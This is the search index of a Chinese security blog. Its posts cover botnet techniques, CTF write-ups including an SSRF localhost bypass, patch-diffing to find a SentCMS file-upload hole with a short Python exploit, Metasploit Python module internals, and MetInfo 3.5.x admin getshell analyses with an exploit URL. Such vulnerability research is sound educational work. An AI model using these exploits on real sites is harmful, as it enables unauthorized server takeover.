{"pages":[{"title":"about","text":"死肥宅 网络安全爱好者 入门级编程","path":"about/index.html","date":"07-26","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"07-26","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"07-26","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"07-26","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"07-26","excerpt":""}],"posts":[{"title":"僵尸网络","text":"此文是学习的一些自我总结 僵尸网络僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络. 传播方法弱口令最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络 传播木马一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100% 远程攻击通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑 获取命令渠道 IPC-&gt;HTTP/DNS-&gt;社交网络 IPC 通过IPC频道下发命令HTTP/DNS 通过http请求/dns请求来下发命令社交网络 通过qq空间/推特推文之类下发命令 可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉 僵尸网络的攻与防打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展 终端攻防安全软件/服务供应商(如云供应商)可以将木马检测删除. 但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败 下发命令渠道通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截. 获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来 命令服务器通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络 僵尸网络的命令服务器网络结构发展 中心化(单命令服务器)-&gt;中心化(多命令服务器)-&gt;星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权) 逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏 fast flux传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址 可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做 可能因为是他们的主要客户并且所在地区无法律要求封停 DGA通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法） 社交网络在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法 作者虽然几率比较小 但是还是有的 史上最强僵尸网络 Mirai 真凶被抓","path":"2018/08/07/botnet/","date":"08-07","excerpt":""},{"title":"pycharm插件","text":"pycharm插件使用打开file-&gt;setting-&gt;plugins 是pycharm的插件界面了 自带的插件比较多 包括了git,ssh,javascript,css等 pycharm也提供了从官方存储库下载的功能，只需点击install jetbrain plugins. 从磁盘下载则是install plugins for disk 常用插件推荐.ignore 版本控制库忽略提交文件 如git的.gitignore 插件 markdown support markdown插件 Material Theme ui pycharm主题 非常好看 ideavim vim操作支持statistic 统计项目行数","path":"2018/06/12/pycharm/","date":"06-12","excerpt":""},{"title":"i春秋61挑战 wp","text":"在i春秋 61挑战出了道简单的签到题题目是一个损坏的pyc文件 wp首先生成一个正常pyc文件 python -m py_compile $filename 对比如下 可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 https://tool.lu/pyc/ 得到反编译代码1_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78)) 打印 _ 得到flag flag{pycyeshipy} 题目很简单 但是不知道为什么只有两位表哥做出来","path":"2018/06/05/newpost/","date":"06-05","excerpt":""},{"title":"一道简单题目","text":"题目代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask, requestimport requestsimport jsonimport socketfrom urllib.parse import urlparsefrom os.path import abspath，isfileapp = Flask(__name__)@app.route(&apos;/&apos;, methods=[&apos;POST&apos;, &apos;PUT&apos;])def main(): if request.method == &apos;POST&apos;: return &apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt; &lt;title&gt;405 Method Not Allowed&lt;/title&gt; &apos; \\ &apos;&lt;h1&gt;Method Not Allowed&lt;/h1&gt; &lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt; &lt;!-- /flag --&gt; &apos; if request.method == &apos;PUT&apos;: if not request.json: return &apos;数据格式错误&apos; data = request.data j_data = json.loads(data) try: url = j_data[&apos;url&apos;] except: return &apos;缺少url字段&apos; try: filename = j_data[&apos;filename&apos;] except: return &apos;缺少filename字段&apos; host = urlparse(url).hostname ip_address = socket.getaddrinfo(host, &apos;http&apos;)[0][4][0] if ip_address == &apos;127.0.0.1&apos;: return &apos;url不能是127.0.0.1&apos; ret = requests.get(url) filename = abspath(filename) if isfile(filename): return &apos;文件已存在&apos; with open(filename) as f: f.write(ret.text) return &apos;文件已写入&apos;@app.route(&apos;/flag&apos;)def flag(): ip = request.remote_addr if ip != &apos;127.0.0.1&apos;: return &apos;你的ip不是127.0.0.1&apos; return &apos;flag&#123;ichunqiu51&#125;&apos;if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;) wp参考思路来源自p牛的博客 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html 技术主要考核了对ip协议的熟悉度 不止127.0.0.1 127.x这个段也是访问本机 过程直接访问/ 发现状态码405 尝试post方法访问 返回界面也是405 但是状态码是200 查看网页源代码 发现注释 /flag 访问获得提示 你的ip不是127.0.0.1 继续尝试 put方法访问/ 得到提示 数据格式错误尝试json 根据提示构造出合适的格式 该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 /static/ 尝试输入127.0.0.1/flag 发现被禁止 尝试绕过127.0.0.2/flag 得到flag","path":"2018/05/31/一道简单题目/","date":"05-31","excerpt":""},{"title":"寻找历史漏洞","text":"前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms 发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址 或者使用git clone https://gitee.com/sentcms/sentcms码云作为中国的github 自然是很方便。但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理因为git的版本管理和提交对比非常实用 也方便保存进度 大致的git操作是123456789git init #初始化git仓库git add * #将旧版本全部文件添加git commit # 作为初始提交# 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/ . 或者其他操作# git status 可能你会想要查看一下文件差异git add * # 将全部文件改变添加git commit # 提交更改# git log 查看日志# git diff 查看差异 找到漏洞版本一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞 但是这个cms没有发行版 如果没有这种信息只能一个提交一个提交的去对比了 可以使用web查看 地址 你也可以使用1git log 我们可以找到一条看起来可能是修复漏洞的提交 比较差异可以在命令行使用git diff 来查看 也可以选择直接在web界面查看每个提交 web提交地址 如果不是git 在linux可以使用diff命令1diff -r dir1 dir2 也可以选择使用一些你喜欢的文件对比工具 最重要的一步 查看代码提交行数不多 快速查看 发现疑似漏洞点可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 地址 这个时候阅读一下readme 可以看到123456│ ├─common COMMON公共模型，不可访问│ │ ├─controller 公共基类目录│ │ ├─model 模型目录│ │ ├─validate 验证配置│ │ ├─view 公共模板目录│ │ ├─widget 扩展组件目录 很明显我们不能直接访问 需要通过调用这个时候Ide就能帮助我们快速找到调用 我们在ide搜索可以找到application/admin/controller/Upload.php 没有进行任何过滤的调用了1234567891011namespace app\\admin\\controller;use app\\common\\controller\\Admin;class Upload extends Admin &#123; public function _empty() &#123; $controller = controller(&apos;common/Upload&apos;); $action = $this-&gt;request-&gt;action(); return $controller-&gt;$action(); &#125;&#125; web地址 这个cms使用了tp5框架 需要通过路由访问我们访问1http://127.0.0.1/sentcms/admin/Upload/Upload 从报错信息可以看到已经执行到了漏洞语句位置由代码可知 直接上传文件即可 python编写exp1234567import requestsurl = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;# 我本地cookeiecookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;r = requests.post(url, files=file，cookies=cookie) 我们可以在uploads\\picture\\20180521找到一个，以微秒时间的md5编码为文件名的php文件","path":"2018/05/22/findbug/","date":"05-22","excerpt":""},{"title":"metasploit python 模块是如何运行","text":"开始metasploit的扩展实现的代码主要在metasploit-framework/lib/msf/core/modules/external目录结构如下123456789101112131415161718├── bridge.rb├── message.rb├── python│ ├── async_timeout│ │ ├── __init__.py│ └── metasploit│ ├── __init__.py│ ├── __init__.pyc│ ├── module.py│ ├── module.pyc│ ├── probe_scanner.py├── shim.rb└── templates ├── capture_server.erb ├── common_metadata.erb ├── dos.erb ├── multi_scanner.erb └── remote_exploit_cmd_stager.erb 其中python目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入metasploittemplates目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如info都是靠这些模板实现的.message.rb和bridge是与msf jsonrpc通信的一些api.shim.rb则是真正将python代码实现为模块的代码. 这里省略了不重要的细节的message.rb代码123456789101112131415161718192021222324252627282930class Msf::Modules::External::Message def self.from_module(j) if j[&apos;method&apos;] m = self.new(j[&apos;method&apos;].to_sym) m.params = j[&apos;params&apos;] m elsif j[&apos;response&apos;] m = self.new(:reply) m.params = j[&apos;response&apos;] m.id = j[&apos;id&apos;] m end end def initialize(m) self.method = m self.params = &#123;&#125; self.id = Base64.strict_encode64(SecureRandom.random_bytes(16)) end def to_json params = if self.params.respond_to? :to_nested_values self.params.to_nested_values else self.params.to_h end JSON.generate(&#123;jsonrpc: &apos;2.0&apos;, id: self.id, method: self.method, params: params&#125;) end 这个类实际上是对传递给metasploit的信息的一个封装.initialize是ruby的初始化方法 从这里可以看到它有三个属性method params id from_module方法则是用于将传递的参数转换成自身to_json方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式) 这里是省略了不重要的细节的bridge.rb代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495require &apos;msf/core/modules/external/message&apos;class Msf::Modules::External::Bridge # 通过jsonrpc运行 def run(datastore) unless self.running m = Msf::Modules::External::Message.new(:run) m.params = datastore.dup send(m) self.running = true end end # 获取当前状态和恢复run状态 def get_status if self.running || !self.messages.empty? m = receive_notification if m.nil? close_ios self.messages.close self.running = false end return m end end # 接收 def recv(filter_id=nil, timeout=600) _, out, err = self.ios message = &apos;&apos; # jsonrpc发送和接受 def send_receive(message) send(message) recv(message.id) end # 发送模块元数据 def describe resp = send_receive(Msf::Modules::External::Message.new(:describe)) close_ios resp.params end # 发送 def send(message) input, output, err, status = ::Open3.popen3(self.env, self.cmd) self.ios = [input, output, err] self.wait_thread = status case select(nil, [input], nil, 0.1) when nil raise &quot;Cannot run module #&#123;self.path&#125;&quot; when [[], [input], []] m = message.to_json write_message(input, m) else raise &quot;Error running module #&#123;self.path&#125;&quot; end end # TODO 这里原本有一大段关于网络接受的代码 # 每个编程语言扩展的具体实现class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge # 判断是否是py文件 def self.applies?(module_name) module_name.match? /\\.py$/ end # 初始化 python扩展添加了额外的路径 def initialize(module_path) super pythonpath = ENV[&apos;PYTHONPATH&apos;] || &apos;&apos; self.env = self.env.merge(&#123; &apos;PYTHONPATH&apos; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&apos;../python&apos;, __FILE__) &#125;) endendclass Msf::Modules::External::Bridge # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge? LOADERS = [ Msf::Modules::External::PyBridge, Msf::Modules::External::Bridge ] # 运行模块方法 让载入的bridge都判断是否是自己所属的 def self.open(module_path) LOADERS.each do |klass| return klass.new module_path if klass.applies? module_path end nil endend 这里是省略了不重要的细节的shim.rb代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657require &apos;msf/core/modules/external/bridge&apos;class Msf::Modules::External::Shim # 将bridge返回的数据生成一个模块 def self.generate(module_path) mod = Msf::Modules::External::Bridge.open(module_path) return &apos;&apos; unless mod.meta # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 case mod.meta[&apos;type&apos;] when &apos;remote_exploit_cmd_stager&apos; remote_exploit_cmd_stager(mod) when &apos;capture_server&apos; capture_server(mod) when &apos;dos&apos; dos(mod) when &apos;scanner.multi&apos; multi_scanner(mod) else # TODO have a nice load error show up in the logs &apos;&apos; end end # 返回一个模块 erb是ruby的一个代码模板库 def self.render_template(name, meta = &#123;&#125;) template = File.join(File.dirname(__FILE__), &apos;templates&apos;, name) ERB.new(File.read(template)).result(binding) end def self.common_metadata(meta = &#123;&#125;) render_template(&apos;common_metadata.erb&apos;, meta) end # 数据转换 def self.mod_meta_common(mod, meta = &#123;&#125;) meta[:path] = mod.path.dump meta[:name] = mod.meta[&apos;name&apos;].dump meta[:description] = mod.meta[&apos;description&apos;].dump meta[:authors] = mod.meta[&apos;authors&apos;].map(&amp;:dump).join(&quot;,\\n &quot;) meta[:options] = mod.meta[&apos;options&apos;].map do |n, o| &quot;Opt#&#123;o[&apos;type&apos;].camelize&#125;.new(#&#123;n.dump&#125;, [#&#123;o[&apos;required&apos;]&#125;, #&#123;o[&apos;description&apos;].dump&#125;, #&#123;o[&apos;default&apos;].inspect&#125;])&quot; end.join(&quot;,\\n &quot;) meta end # 渲染膜拜 def self.dos(mod) meta = mod_meta_common(mod) meta[:date] = mod.meta[&apos;date&apos;].dump meta[:references] = mod.meta[&apos;references&apos;].map do |r| &quot;[#&#123;r[&apos;type&apos;].upcase.dump&#125;, #&#123;r[&apos;ref&apos;].dump&#125;]&quot; end.join(&quot;,\\n &quot;) render_template(&apos;dos.erb&apos;, meta) endend 所以python模块的运行过程其实是这样的 class Msf::Modules::External::Shim获取到了模块路径 调用Msf::Modules::External::Bridge.open 在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块) 初始化一个Msf::Modules::External::PyBridge并返回 判断元数据类型 假设是dos 则调用dos方法 调用mod_meta_common方法转换元数据 渲染代码模板 我们可以查看dos.erb的内容1234567891011121314151617181920212223242526272829require &apos;msf/core/modules/external/bridge&apos;require &apos;msf/core/module/external&apos;class MetasploitModule &lt; Msf::Auxiliary include Msf::Module::External include Msf::Auxiliary::Dos def initialize super(&#123; &lt;%= common_metadata meta %&gt; &apos;References&apos; =&gt; [ &lt;%= meta[:references] %&gt; ], &apos;DisclosureDate&apos; =&gt; &lt;%= meta[:date] %&gt;, &#125;) register_options([ &lt;%= meta[:options] %&gt; ]) end def run print_status(&quot;Starting server...&quot;) mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;) mod.run(datastore) wait_status(mod) endend 所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在12mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)mod.run(datastore) 最后通过bridge.run调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好","path":"2018/02/05/metasploit-python-模块是如何运行/","date":"02-05","excerpt":""},{"title":"metasploit python 模块","text":"metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby 为什么将python作为官方支持语言 很多不是metasploit官方人员编程的模块都是使用python编写 现在python流行程度非常高 很多渗透人员python熟练程度比ruby高 metasploit的python模块是什么主分支的一个python模块 https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py python模块实际是通过json-rpc调用与metasploit通信 metasploit获取元数据如图(来自官方博客)12345678910111213+------------+| Metasploit || | Describe yourself +-------------------+| +-------------------&gt; | some_module.py || | | || | | || | Some metadata | || | &lt;-------------------+ || | | || | +-------------------+| || |+------------+ 模块调用如图123456789101112131415161718+------------+| Metasploit | Do a thing with| | these options +-------------------+| +-------------------&gt; | some_module.py || | | || | | || | A bit of status | || | &lt;-------------------+ || | | || | Moar status | || | &lt;-------------------+ || | | || | I found a thing | || | &lt;-------------------+ || | | || | +-------------------+| |+------------+ 将会发生什么实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块 python在metasploit能做什么可以使用的和ruby模块并没有区别 如何编写一个python模块首先需要导入需要的模块123#!/usr/bin/env python# another:bluebirdfrom metasploit import module 这个metasploit实际上路径是 lib/msf/core/modules/external/python/ 然后定义元数据 格式和ruby模块的一样.详细可参考这里的文档 123456789101112131415161718192021222324metadata = &#123; # 模块名字 &apos;name&apos;: &apos;metasploit python module demo &apos;, # 模块的描述 &apos;description&apos;: &apos;&apos;&apos; send a http request metasploit python module demo &apos;&apos;&apos;, # 模块作者 &apos;authors&apos;: [ &apos;bluebird&apos;, ], # 编写时间 &apos;date&apos;: &apos;2018-02-02&apos;, # 漏洞参考 &apos;references&apos;: [ ], # 漏洞类型 只能在已有的类型选项 &apos;type&apos;: &apos;dos&apos;, # 模块选项 &apos;options&apos;: &#123; &apos;rhost&apos;: &#123;&apos;type&apos;: &apos;address&apos;, &apos;description&apos;: &apos;The target address&apos;, &apos;required&apos;: True, &apos;default&apos;: None&#125;, &apos;rport&apos;: &#123;&apos;type&apos;: &apos;port&apos;, &apos;description&apos;: &apos;The target port&apos;, &apos;required&apos;: True, &apos;default&apos;: 80&#125;, &#125;&#125; 然后一般应该定义一个run方法.这个demo输出了helloworld12def run(args): module.log(&apos;helloworld&apos;) 最后定义主方法12if __name__ == &quot;__main__&quot;: module.run(metadata, run) 让我们实际跑一下(注意请给你的python文件添加执行权限)12345678msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1rhost =&gt; 127.0.0.1msf5 auxiliary(test/demo) &gt; run[*] Starting server...[*] hello world[*] Auxiliary module execution completedmsf5 auxiliary(test/demo) &gt;","path":"2018/02/02/metasploit-python-模块/","date":"02-02","excerpt":""},{"title":"metinfo3.5.19后台getshell分析","text":"metinfo后台getshellexp分析漏洞版本3.5.19 漏洞文件路径/admin/app/physical/physical.php有趣的是3.5.18修复的后台getshell也是这个文件3.5.18漏洞分析 点我上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享 漏洞代码1234567891011121314elseif($action==&quot;op&quot;)&#123; // 不相关代码 $val=explode(&apos;|&apos;,$valphy); // 不相关代码 switch($op)&#123; // 不相关代码 case 3: $fileaddr=explode(&apos;/&apos;,$val[1]); $filedir=&quot;../../../&quot;.$fileaddr[0]; if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; if($fileaddr[1]==&quot;index.php&quot;)&#123; if($val[2])&#123; Copyindx(&quot;../../../&quot;.$val[1],$val[2]); &#125; 需要op参数为3才能进入漏洞代码流程，并且要正常执行，需要fileaddr[1]=&#39;index.php&#39;和$val[2]也就是valphy参数要为xxx|xxx/index.php|xxx格式 查看Copyindex函数12345678910111213function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; if($type==3)&#123; //生成产品栏目index $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule=&apos;product_index&apos;;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;; &#125;else&#123; $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;; &#125; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; 可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控","path":"2017/11/28/metinfo3-5-19后台getshell分析/","date":"11-28","excerpt":""},{"title":"metinfo3.5.18后台getshell分析","text":"此漏洞已经在最新版修复 exp /admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件 代码分析查看关键代码123456789101112131415161718192021222324252627282930313233343536373839case 3: $fileaddr=explode('/',$val[1]); $filedir=\"../../../\".$fileaddr[0]; if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; if($fileaddr[1]==\"index.php\")&#123; if($val[2])&#123; Copyindx(\"../../../\".$val[1],$val[2]); &#125; &#125;else&#123; // 漏洞点 switch($val[2])&#123; case 1: $address=\"../about/$fileaddr[1]\"; break; case 2: $address=\"../news/$fileaddr[1]\"; break; case 3: $address=\"../product/$fileaddr[1]\"; break; case 4: $address=\"../download/$fileaddr[1]\"; break; case 5: $address=\"../img/$fileaddr[1]\"; break; case 8: $address=\"../feedback/$fileaddr[1]\"; break; &#125; $newfile =\"../../../$val[1]\"; Copyfile($address,$newfile); &#125; echo $lang_physicalgenok; break; 我们可以看到我们可控参数$address和newfile传入了Copyfile主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行Copyfile 查看Copyfile函数12345678function Copyfile($address,$newfile)&#123; $oldcont = \"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"; if(!file_exists($newfile))&#123; $fp = fopen($newfile,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; 此函数可以创建并写入文件可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell 查看最新版本修复方法123default: $address = \"\";break; 添加了不是正常参数时候默认为空","path":"2017/11/25/metinfoexp/","date":"11-25","excerpt":""}]}